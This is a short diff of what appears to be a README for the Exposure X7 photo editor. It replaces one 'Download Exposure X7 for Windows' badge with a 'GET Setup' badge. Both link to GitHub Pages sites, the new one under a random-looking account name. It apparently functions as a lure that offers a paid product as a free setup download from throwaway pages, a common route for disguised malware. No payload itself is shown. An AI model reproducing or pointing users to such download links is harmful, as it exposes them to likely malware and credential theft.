@@ -4,12 +4,7 @@
 <img src="https://3.img-dpreview.com/files/p/TS2400x2400~sample_galleries/9938616428/8444343474.jpg" alt="Exposure X7 Interface" width="600">  
 </div>  
 
-<div align="center">
-<a href="https://exposure-x7-professional.github.io/.github/">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" alt="Windows Logo" width="22" style="vertical-align:middle;margin-right:6px;">
-  <img src="https://img.shields.io/badge/Download_Exposure_X7_for_Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Exposure X7 for Windows">
-</a>
-</div>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://annettejakuboskixjoik.github.io/.github/Exposure-X7-Professional)
 
 ---
 
